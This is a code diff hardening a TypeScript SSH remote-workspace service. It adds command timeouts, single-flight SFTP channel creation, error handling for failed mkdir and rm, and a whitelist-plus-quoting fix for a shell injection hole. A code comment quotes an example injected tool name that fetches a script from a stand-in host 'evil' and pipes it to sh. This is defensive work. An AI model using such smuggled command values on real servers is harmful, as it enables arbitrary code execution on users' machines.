@@ -39,6 +39,8 @@ interface ActiveConnection {
 	hostKey: string;
 	client: Client;
 	sftp?: SFTPWrapper;
+	// 并发首调的在途 SFTP 子系统通道 Promise（单飞，防止重复开通道泄漏）
+	sftpInflight?: Promise<SFTPWrapper>;
 	params: RemoteSshProbeParams;
 	system?: RemoteSshSystemInfo;
 	alive: boolean;
@@ -701,11 +703,25 @@ export class RemoteSshService {
 		return conn;
 	}
 
-	/** 执行远端 shell 命令并获取 stdout */
-	private async execCommand(client: Client, cmd: string): Promise<string> {
+	/** 执行远端 shell 命令并获取 stdout（默认 120s 超时——探针/安装脚本挂起时不至于永久 pending） */
+	private async execCommand(client: Client, cmd: string, timeoutMs = 120_000): Promise<string> {
 		return new Promise((resolve, reject) => {
+			let settled = false;
+			const timer =
+				timeoutMs > 0
+					? setTimeout(() => {
+							if (settled) return;
+							settled = true;
+							reject(new Error(`Remote command timed out after ${timeoutMs}ms`));
+						}, timeoutMs)
+					: null;
 			client.exec(cmd, (err, stream) => {
-				if (err) return reject(err);
+				if (err) {
+					if (settled) return;
+					settled = true;
+					if (timer) clearTimeout(timer);
+					return reject(err);
+				}
 				let stdout = "";
 				let stderr = "";
 				stream.on("data", (chunk: Buffer) => {
@@ -715,13 +731,21 @@ export class RemoteSshService {
 					stderr += chunk.toString("utf8");
 				});
 				stream.on("close", (code: number) => {
+					if (settled) return;
+					settled = true;
+					if (timer) clearTimeout(timer);
 					if (code === 0) {
 						resolve(stdout);
 					} else {
 						resolve(stdout || stderr);
 					}
 				});
-				stream.on("error", (e: Error) => reject(e));
+				stream.on("error", (e: Error) => {
+					if (settled) return;
+					settled = true;
+					if (timer) clearTimeout(timer);
+					reject(e);
+				});
 			});
 		});
 	}
@@ -952,22 +976,29 @@ done
 		return { conn, sftp, parsed };
 	}
 
-	/** 获取 SFTP 会话 */
+	/** 获取 SFTP 会话（单飞：并发首调共享同一条在途通道，不重复开） */
 	private async getSftp(conn: ActiveConnection): Promise<SFTPWrapper> {
 		if (conn.sftp) return conn.sftp;
-		return new Promise((resolve, reject) => {
-			conn.client.sftp((err, sftp) => {
-				if (err) return reject(err);
-				sftp.once("close", () => {
-					if (conn.sftp === sftp) conn.sftp = undefined;
+		if (!conn.sftpInflight) {
+			const promise = new Promise<SFTPWrapper>((resolve, reject) => {
+				conn.client.sftp((err, sftp) => {
+					if (err) return reject(err);
+					sftp.once("close", () => {
+						if (conn.sftp === sftp) conn.sftp = undefined;
+					});
+					sftp.once("end", () => {
+						if (conn.sftp === sftp) conn.sftp = undefined;
+					});
+					conn.sftp = sftp;
+					resolve(sftp);
 				});
-				sftp.once("end", () => {
-					if (conn.sftp === sftp) conn.sftp = undefined;
-				});
-				conn.sftp = sftp;
-				resolve(sftp);
 			});
-		});
+			conn.sftpInflight = promise;
+			promise.finally(() => {
+				if (conn.sftpInflight === promise) conn.sftpInflight = undefined;
+			});
+		}
+		return conn.sftpInflight;
 	}
 
 	/** 浏览远程目录 */
@@ -1070,8 +1101,15 @@ done
 		output?: string;
 		error?: string;
 	}> {
+		const requested = tools[0] || "git";
+		// 工具名直接拼进远端 root/sudo shell：白名单字符集 + shell 引用双保险，
+		// 否则 tools:["git; curl evil|sh"] 即在用户 SSH 服务器上执行任意命令。
+		// 放在 getConnection 之前：非法名字无需连接即可快速失败。
+		if (!/^[a-zA-Z][a-zA-Z0-9._+-]{0,63}$/.test(requested)) {
+			return { ok: false, connectionId, tool: requested, error: `非法的工具名：${requested}` };
+		}
 		const conn = this.getConnection(connectionId);
-		const tool = tools[0] || "git";
+		const tool = shellQuotePosix(requested);
 
 		const installScript = `
 if command -v apt-get >/dev/null 2>&1; then
@@ -1101,7 +1139,7 @@ fi
 			return {
 				ok: installed,
 				connectionId,
-				tool,
+				tool: requested,
 				output,
 				error: installed ? undefined : `执行完成但未检测到 ${tool} 二进制文件，可能需要 sudo 密码权限`,
 			};
@@ -1109,7 +1147,7 @@ fi
 			return {
 				ok: false,
 				connectionId,
-				tool,
+				tool: requested,
 				error: (err as Error).message,
 			};
 		}
@@ -1183,7 +1221,16 @@ fi
 					opts?.onData?.(chunk);
 				});
 				stream.on("close", (code: number | null) => {
-					finish({ stdout, stderr, exitCode: typeof code === "number" ? code : 0 });
+					// 连接中断/远端被 kill -9 时没有 exit-status：本地 SDK 路径对此显式
+					// 抛错——这里同样按错误处理，否则 bash 工具会把断线谎报成「命令成功」
+					if (typeof code === "number") {
+						finish({ stdout, stderr, exitCode: code });
+					} else {
+						finish(
+							{ stdout, stderr, exitCode: 1 },
+							new Error("Remote command terminated without an exit code (connection lost or process killed)"),
+						);
+					}
 				});
 				stream.on("error", (e: Error) => {
 					finish({ stdout, stderr, exitCode: 1 }, e);
@@ -1297,7 +1344,10 @@ fi
 
 	/** 递归创建远程目录 (mkdir -p) */
 	async sftpMkdirRecursive(uri: string, remoteAbsPath: string): Promise<void> {
-		await this.execInWorkspace(uri, `mkdir -p ${shellQuotePosix(remoteAbsPath)}`, { cwd: "/" });
+		const res = await this.execInWorkspace(uri, `mkdir -p ${shellQuotePosix(remoteAbsPath)}`, { cwd: "/" });
+		if (res.exitCode !== 0) {
+			throw new Error(res.stderr || res.stdout || `Remote mkdir failed for ${remoteAbsPath}`);
+		}
 	}
 
 	/** 重命名或移动远程文件/目录 */
@@ -1316,7 +1366,12 @@ fi
 		if (!remoteAbsPath || remoteAbsPath === "/") {
 			throw new Error("Refusing to remove root directory");
 		}
-		await this.execInWorkspace(uri, `rm -rf ${shellQuotePosix(remoteAbsPath)}`, { cwd: "/" });
+		// 与 sftpCopy 同口径：退出码非 0 必须抛错，否则权限不足/目录被占用时
+		// files-service 仍会向用户广播「已删除」
+		const res = await this.execInWorkspace(uri, `rm -rf ${shellQuotePosix(remoteAbsPath)}`, { cwd: "/" });
+		if (res.exitCode !== 0) {
+			throw new Error(res.stderr || res.stdout || `Remote remove failed for ${remoteAbsPath}`);
+		}
 	}
 
 	/** 复制或移动远程文件/目录 */
@@ -1371,6 +1426,13 @@ fi
 					(err, stream) => {
 						if (err || killed) {
 							if (err) emitData(`\r\n[SSH Terminal Error: ${err.message}]\r\n`);
+							if (killed && !err) {
+								// 握手完成前已被 kill：必须关掉已打开的 shell channel，
+								// 否则远端 PTY 里的登录 shell 一直跑到整条连接断开才回收
+								try {
+									stream.close();
+								} catch {}
+							}
 							emitExit(1);
 							return;
 						}
